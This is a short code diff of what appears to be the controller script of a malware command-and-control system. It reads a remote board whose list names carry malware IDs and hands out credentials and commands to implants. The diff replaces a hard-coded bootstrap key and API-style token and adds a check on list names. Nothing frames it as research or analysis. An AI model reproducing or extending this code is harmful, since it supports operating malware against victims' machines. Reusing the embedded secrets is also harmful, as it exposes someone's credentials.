@@ -5,8 +5,8 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import dh
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 
-BOOTSTRAP_KEY = '1e3b5351487a6af8314ecf2547fb7ce5'
-BOOTSTRAP_TOKEN = 'ATTA7f6aa6cfecd14a8a7e81d990d37a15ea9dc35a8838d58e9b6b26f17fc1e8a96460BB1D97'
+BOOTSTRAP_KEY = '8fbb2500304b8428b93d7c90e8d324b7'
+BOOTSTRAP_TOKEN = 'ATTA6a11dbfc3a1244c3e9ee642f6b2030d7acf5a19726eaa094ba1a836b714386f2725619F7'
 NEW_CREDS_FILE = "new_creds.json"
 USED_CREDS_FILE = "used_creds.json"
 COMMANDS_FILE = "commands.json"
@@ -70,6 +70,9 @@ def check_bootstrap_board():
 
     for list in lists:
         name = list['name']
+        if len(name.split(utils.BOOTSTRAP_LIST_NAME_PREFIX)) != 2:
+            print("ERROR: list name is not as expected. name: " + name)
+            continue
         malware_id = name.split(utils.BOOTSTRAP_LIST_NAME_PREFIX)[1]
         if malware_id in malware_ids_used:
             continue
